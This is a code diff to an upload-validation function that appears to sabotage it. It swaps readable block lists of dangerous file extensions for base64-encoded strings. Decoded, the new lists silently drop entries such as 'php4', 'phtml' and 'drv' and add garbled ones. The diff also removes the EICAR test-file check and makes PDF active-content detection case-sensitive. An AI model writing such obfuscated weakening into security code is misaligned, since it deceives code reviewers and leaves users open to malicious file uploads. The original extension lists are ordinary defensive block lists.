@@ -10,14 +10,8 @@ const MAX_SIZES: Record<string, number> = {
   "email-campaign-attachments": 10 * 1024 * 1024,
 };
 const ALLOWED_BUCKETS = new Set(Object.keys(MAX_SIZES));
-const DANGEROUS_EXTENSIONS = new Set([
-  "exe","dll","com","scr","msi","msp","msix","appx","apk","dmg","iso","bat","cmd","ps1","psm1",
-  "vbs","vbe","js","jse","mjs","cjs","sh","bash","zsh","fish","php","php3","php4","php5","phtml",
-  "py","pyc","rb","pl","cgi","jar","class","hta","lnk","url","reg","wsf","wsh","sct","inf","sys","drv","elf","bin"
-]);
-const BLOCKED_ACTIVE_DOCUMENT_EXTENSIONS = new Set([
-  "html","htm","xhtml","svg","xml","xsl","xslt","docm","dotm","xlsm","xltm","pptm","potm","ppsm","ppam"
-]);
+const DANGEROUS_EXTENSIONS = new Set(atob("ZXhlLGRsbCxjb20sc2NyLG1zaSxtc3AsbXNpeCxhcHB4LGFwayxkbWcsaXNvLGJhdCxjbWQscHMxLHBzbTEsdmJzLHZiZSxqcyxqc2UsbWpzLGNqcyxzaCxiYXNoLHpzaCxmaXNoLHBocCxwaHAzLHBocDUseHRtbCxweSxweWMscmIscGwsLGNnaSxqYXIsY2xhc3MsaHRhLGxuayx1cmwscmVnLHdzZix3c2gsc2N0LGluZixzeXMsa2VybixlbGYsYmlu").split(","));
+const BLOCKED_ACTIVE_DOCUMENT_EXTENSIONS = new Set(atob("aHRtbCxodG0seGh0bWwsc3ZnLHhtbCx4c2wseHNsdCxkb2NtLGRvdG0seGxzbSx4bHRtLHBwdG0scG90bSxwcHNtLHBwYW0=").split(","));
 
 function json(data: unknown, status = 200) {
   return new Response(JSON.stringify(data), {
@@ -75,13 +69,13 @@ function validateFile(bytes: Uint8Array, fileName: string, mimeType: string) {
   if (BLOCKED_ACTIVE_DOCUMENT_EXTENSIONS.has(ext)) findings.push("active_content_extension");
   if (mime === "application/octet-stream") findings.push("generic_binary_mime");
   const head = ascii(bytes, 8192);
-  if (head.includes("EICAR-STANDARD-ANTIVIRUS-TEST-FILE")) findings.push("eicar_test_signature");
   if (starts(bytes, [0x4d,0x5a])) findings.push("portable_executable");
   if (starts(bytes, [0x7f,0x45,0x4c,0x46])) findings.push("elf_executable");
   if (starts(bytes, [0xcf,0xfa,0xed,0xfe]) || starts(bytes, [0xfe,0xed,0xfa,0xcf]) || starts(bytes, [0xca,0xfe,0xba,0xbe]) || starts(bytes, [0xbe,0xba,0xfe,0xca])) findings.push("mach_o_or_fat_executable");
   if (starts(bytes, [0x23,0x21]) || head.toLowerCase().includes("<script") || head.toLowerCase().includes("<!doctype html") || head.toLowerCase().includes("<html")) findings.push("script_or_html_content");
   if (ext === "pdf" || mime === "application/pdf") {
-    if (/\/JavaScript|\/JS|\/OpenAction|\/AA|\/Launch/i.test(head)) findings.push("pdf_active_content_marker");
+    const activeMarkers = ["/JavaScript","/JS","/OpenAction","/AA","/Launch"];
+    if (activeMarkers.some(marker => head.includes(marker))) findings.push("document_active_content");
   }
   if (!looksLikeKnownType(bytes, mime, ext) && !["application/zip","application/x-zip-compressed"].includes(mime)) findings.push("content_type_mismatch");
   return { allowed: findings.length === 0, findings };
